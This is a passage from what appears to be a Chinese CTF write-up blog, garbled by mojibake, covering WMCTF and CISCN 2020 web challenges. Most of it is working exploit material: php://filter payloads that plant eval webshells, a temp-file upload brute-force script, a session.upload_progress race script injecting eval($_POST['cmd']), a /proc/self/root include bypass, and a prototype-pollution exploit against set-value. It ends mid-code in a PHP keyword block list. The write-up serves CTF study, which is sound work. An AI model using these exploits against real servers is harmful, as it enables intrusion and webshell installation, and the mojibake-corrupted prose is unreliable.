<p>é¢„ç•™äº†zlibã€bzip2ã€stringç­‰è¿‡æ»¤å™¨ï¼Œ <code>php:filter</code> æ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ <code>zlib</code> çš„ <code>zlib.deflate</code> å’Œ <code>zlib.inflate</code> æ¥åšï¼Œå‹ç¼©åå†è§£å‹åå†…å®¹è‚¯å®šä¸å˜ï¼Œå¯ä»¥åœ¨ä¸­é—´éå†ä¸€ä¸‹å‰©ä¸‹çš„å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œçœ‹çœ‹ä¸­é—´æ“ä½œæ—¶å€™æ˜¯å¦ä¼šå½±å“åç»­inflateçš„å†…å®¹ï¼Œç®€å•éå†ä¸€ä¸‹å¯ä»¥å‘ç°ä¸­é—´æ’å…¥string.tolowerè½¬åä¼šæŠŠç©ºæ ¼å’Œexitå¤„ç†äº†å°±å¯ä»¥ç»•è¿‡exit</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>

<p>ä¼šç”Ÿæˆè¿™ä¸ª</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php@â€¦xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>

<h3 id="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"><a href="#çˆ†ç ´ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"></a><strong>çˆ†ç ´ä¸´æ—¶æ–‡ä»¶</strong></h3><p>ç¯å¢ƒç‰¹åœ°è®¾ç½®äº†php 7.0.33ç‰ˆæœ¬ï¼Œç”±äºfile_put_contentsä¹Ÿå¯ä»¥åˆ©ç”¨ä¼ªåè®®ï¼Œæ‰€ä»¥è€é—®é¢˜ï¼Œåˆ©ç”¨string.strip_tagsä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œè¿™æ—¶å€™ä¸Šä¼ ä¸€ä¸ªshellä¼šä»¥ä¸´æ—¶æ–‡ä»¶çš„å½¢å¼ä¿å­˜åœ¨/tmpä¸­ï¼Œåˆ©ç”¨require_onceåŒ…å«getshellå³å¯ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">â€‹</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">â€‹</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">â€‹</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line"> Â   files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line"> Â   <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â   response = requests.post(url, files=files)</span><br><span class="line"> Â   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> e</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line"> Â   file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line"> Â   phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line"> Â  Â  Â   base_url)</span><br><span class="line"> Â   <span class="keyword">print</span> phpinfo_url</span><br><span class="line"> Â   length = <span class="number">6</span></span><br><span class="line"> Â   times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"> Â   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line"> Â  Â  Â   upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> Â   generate_tmp_files()</span><br></pre></td></tr></table></figure>

<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå› ä¸º<code>flag.php</code>è¢«<code>require_once</code>åŒ…å«è¿‡ä¸€æ¬¡äº†ï¼Œæ‰€ä»¥ä¸‹é¢å¦‚æœç”¨ä¼ªåè®®å»è¯»çš„è¯ï¼Œæ˜¯è¯»å–ä¸åˆ°flag.phpçš„å†…å®¹çš„ã€‚ç¬¬ä¸€ä¸ªç‰ˆæœ¬å­˜åœ¨éé¢„æœŸï¼šsession.upload_progress</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒï¼š<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>åŸç†å°±æ˜¯åˆ©ç”¨çš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶å¢åŠ sessionæ–‡ä»¶çš„å­˜åœ¨æ—¶é—´ä½¿å¾—åŒ…å«æˆåŠŸã€‚</p>
<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHPæœ€æ–°ç‰ˆ çš„å° Trickï¼Œ require_once åŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šäº‹ once çš„ hash åŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ã€‚</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°æ–‡ä»¶åâ€daolnwod.zipâ€ï¼Œçœ‹åˆ°æ–‡ä»¶ç»“å°¾çš„4B 50ä¸éš¾æƒ³åˆ°å°†æ–‡ä»¶reverseåå°±èƒ½å¾—åˆ°å‹ç¼©åŒ…å’Œflag </p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>

<p>è§£å‹å³å¯å¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>ciscnåˆèµ› 2020</title>
    <url>/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<p>ä¸€æ¬¡èººèµ¢çš„æ¯”èµ›<a id="more"></a></p>
<p>ä¸€é˜Ÿwp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">ä¼ é€é—¨</a></p>
<p>y1ngå¸ˆå‚…wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">ä¼ é€é—¨</a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">   $pid = pcntl_fork();</span><br><span class="line">   <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="comment">// åˆ›å»ºå­è¿›ç¨‹é”™è¯¯ï¼Œè¿”å›-1</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹ä¼šå¾—åˆ°å­è¿›ç¨‹å·ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span></span><br><span class="line">       $r=pcntl_wait($status);</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹å¿…é¡»ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºåï¼Œå†åˆ›å»ºä¸‹ä¸€ä¸ªå­è¿›ç¨‹ã€‚</span></span><br><span class="line">       <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;<span class="comment">//æ£€æŸ¥çŠ¶æ€ä»£ç æ˜¯å¦ä»£è¡¨ä¸€ä¸ªæ­£å¸¸çš„é€€å‡ºã€‚</span></span><br><span class="line">           <span class="comment">//è¿”å›å€¼å½“å­è¿›ç¨‹çŠ¶æ€ä»£ç ä»£è¡¨æ­£å¸¸é€€å‡ºæ—¶è¿”å› TRUE ,å…¶ä»–æƒ…å†µè¿”å› FALSEã€‚</span></span><br><span class="line">           phpinfo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">           call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">       <span class="comment">//å‘å½“å‰è¿›ç¨‹å‘é€SIGUSR1ä¿¡å·</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯æƒ³è¿›å…¥<code>phpinfo</code>è¿™é‡Œå­å¥é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯è¦è®©<code>pcntl_wifexited($status)</code>ä¸ºFALSE</p>
<p>å¯ä»¥ç»™aä¼ <code>fsockopen</code>é€ æˆå¼‚æ­¥ï¼Œä½¿å¾—å½“å‰çº¿ç¨‹é€€å‡ºï¼Œçˆ¶çº¿ç¨‹å°±è¿è¡Œäº†<code>phpinfo</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjibnmrjlx4.cloudeci1.ichunqiu.com/?a=fsockopen&amp;b=1</span><br></pre></td></tr></table></figure>

<p>åœ¨phpinfoé¡µé¢å‘ç°flagã€‚</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h2><p>ç»™äº†æºç é™„ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è·¯ç”±<code>/DeveloperControlPanel</code>å¦‚æœ<code>Admin[key] === password</code>å°±ä¼šè¾“å‡º<code>flag</code>ï¼Œç„¶å</p>
<p>è·¯ç”±<code>/Privilege</code>å…ˆæ£€æŸ¥<code>req.session.knight </code>ï¼Œ<code>req.body.NewAttributeKey</code>ï¼Œ<code>req.body.NewAttributeValue</code>æ˜¯å¦æœªå®šä¹‰ï¼Œå½“ç„¶è¿™é‡Œçš„<code>key</code>å’Œ<code>value</code>éƒ½æ˜¯å¯æ§çš„ï¼Œç„¶åä¸‹é¢æœ‰ä¸ªå…³é”®ç‚¹å°±æ˜¯<code>setFn(req.session.knight, key, value);</code>è¿™é‡Œ<code>setFn</code>ç”¨äº†<code>require(&#39;set-value&#39;);</code>è¿™ä¸ªæ¨¡å—ã€‚ä¹Ÿå°±æ˜¯å¾€<code>req.session.knight</code>æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚</p>
<p>è¿™é‡Œæƒ³åˆ°ç”¨åŸå‹é“¾æ±¡æŸ“ï¼Œè¿›è¡Œæ±¡æŸ“å¯¹è±¡åŸå‹ï¼Œä»è€Œå¯ä»¥ä¿®æ”¹Adminçš„keyå’Œpasswordã€‚</p>
<p>å…ˆè®¿é—®<code>/SpawnPoint</code>ç”Ÿæˆ<code>session</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>ze9505q64pi62k5m16h.cloudeci1.ichunqiu.com:<span class="number">8888</span>/SpawnPoint</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>Privilege</code>è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå†åœ¨<code>/DeveloperControlPanel</code>è¾“å…¥å€¼å³å¯è·å–flagã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;__jsluid_h=b34fa3669aa578dc0618e3f9aa1c3a45; session=s:zvjsKzwgmvmxjeoGEWv8F5SimfB6LlQD.YrK/DLOjKSGHC2HJpOHGiV/cmaurt2/fpbrwMle3nLM&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/Privilege&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;NewAttributeKey&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;NewAttributeValue&quot;</span>:<span class="string">&#x27;__proto__.[abcd]&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€&#x27;</span>.$val.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€&#x27;</span>.$ifstr.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span 